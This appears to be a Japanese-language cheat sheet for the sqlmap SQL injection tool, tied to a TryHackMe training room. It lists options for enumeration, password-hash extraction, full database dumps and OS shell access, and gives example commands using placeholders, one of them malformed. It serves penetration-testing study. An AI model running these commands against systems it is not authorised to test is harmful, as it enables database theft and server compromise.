# sqlmap

https://tryhackme.com/room/sqlmap

## コマンドオプション

### 基本オプション

| オプション             | 説明                                                                 |
|------------------------|----------------------------------------------------------------------|
| `-u URL`, `--url=URL`  | 対象のURL（例: "http://www.site.com/vuln.php?id=1"）                |
| `--data=DATA`          | POSTで送信するデータ文字列（例: "id=1"）                            |
| `--random-agent`       | ランダムに選ばれたHTTP User-Agentヘッダーを使用                     |
| `-p TESTPARAMETER`     | テスト対象のパラメータ                                               |
| `--level=LEVEL`        | 実行するテストのレベル（1〜5、デフォルトは1）                        |
| `--risk=RISK`          | 実行するテストのリスクレベル（1〜3、デフォルトは1）                  |
| `-h` | ヘルプ |
| `-hh` | Advanced ヘルプ|

### 列挙オプション

| オプション             | 説明                                                                          |
|------------------------|---------------------------------------------------------------------------------|
| `-a`, `--all`          | すべての情報を取得する                                                          |
| `-b`, `--banner`       | DBMSのバナー情報を取得する                                                      |
| `--current-user`       | DBMSの現在のユーザーを取得する                                                  |
| `--current-db`         | DBMSの現在のデータベースを取得する                                              |
| `--passwords`          | DBMSユーザーのパスワードハッシュを列挙する                                     |
| `--dbs`                | DBMSのデータベースを列挙する                                                    |
| `--tables`             | DBMSのデータベーステーブルを列挙する                                            |
| `--columns`            | DBMSのデータベーステーブルのカラムを列挙する                                    |
| `--schema`             | DBMSのスキーマを列挙する                                                        |
| `--dump`               | DBMSのデータベーステーブルのデータをダンプする                                  |
| `--dump-all`           | すべてのDBMSデータベーステーブルのデータをダンプする                            |
| `--is-dba`             | 現在のDBMSユーザーがDBA（管理者）かどうかを検出する                             |
| `-D <DB NAME>`         | 列挙対象のDBMSデータベースを指定する                                            |
| `-T <TABLE NAME>`      | 列挙対象のDBMSデータベーステーブルを指定する                                    |
| `-C COL`               | 列挙対象のDBMSデータベーステーブルのカラムを指定する                            |

### OSアクセスオプション

| オプション              | 説明                                                                 |
|-------------------------|----------------------------------------------------------------------|
| `--os-shell`            | 対話型のOSシェルを起動するプロンプトを表示                             |
| `--os-pwn`              | OOBシェル、Meterpreter、またはVNCの起動プロンプトを表示                 |
| `--os-cmd=OSCMD`        | 指定したOSコマンドを実行する                                           |
| `--priv-esc`            | データベースプロセスユーザーの権限昇格を試みる                           |
| `--os-smbrelay`         | ワンクリックでOOBシェル、Meterpreter、またはVNCを起動するプロンプトを表示 |
| `--sql-shell`            | 対話型のSQLシェルを起動するプロンプトを表示                             |

## 実行方法

Burp等でファイル保存したリクエストを利用するのが簡単。

```shell
# DB名列挙
sqlmap -r <request_file> -p <vulnerable_parameter> --dbs

# DB指定してテーブル名列挙
sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables

# テーブル指定して列名を列挙
sqlmap -r req.txt -D <database_name> -T <table_name> --columns

# 全てをダンプ
sqlmap -r req.txt-p  -D <database_name> --dump-all

# GETの例
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables
```

